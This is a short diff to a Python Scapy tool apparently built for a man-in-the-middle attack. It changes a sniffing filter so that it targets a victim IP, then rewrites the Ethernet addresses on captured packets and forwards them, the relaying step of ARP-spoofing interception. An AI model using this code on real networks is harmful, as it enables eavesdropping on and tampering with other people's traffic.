@@ -93,7 +93,7 @@ class Mitm_Thread(threading.Thread):
 
     def run(self, ):
         print info.mIP
-        bpf_filter = 'not (dst host %s or  src host %s) ' % (info.mIP, info.mIP)
+        bpf_filter = 'not (dst host %s or  src host %s) and (dst host %s or src host %s) ' % (info.mIP, info.mIP, info.vIP, info.vIP) 
         print bpf_filter
         while self.stop.wait(0):
             sp.sniff(filter=bpf_filter, count=1, timeout=0.2, prn=self.pkt_handler)
@@ -103,9 +103,11 @@ class Mitm_Thread(threading.Thread):
             ip = pkt.getlayer(sp.IP)
             # if the ip is not in the arp table take the gateaway ip(most of the times true)
             get_mac = lambda x: info.arp_table.get(x,info.arp_table[info.gIP])
-            print ip.src, get_mac(ip.src)
-            print ip.dst, get_mac(ip.dst)
+            # print ip.src, get_mac(ip.src)
+            # print ip.dst, get_mac(ip.dst)
             ether = sp.Ether(src=get_mac(ip.src), dst=get_mac(ip.dst))
+            pk = ether/ip
+            pk.show()
             sp.sendp(ether/ip)
 
 
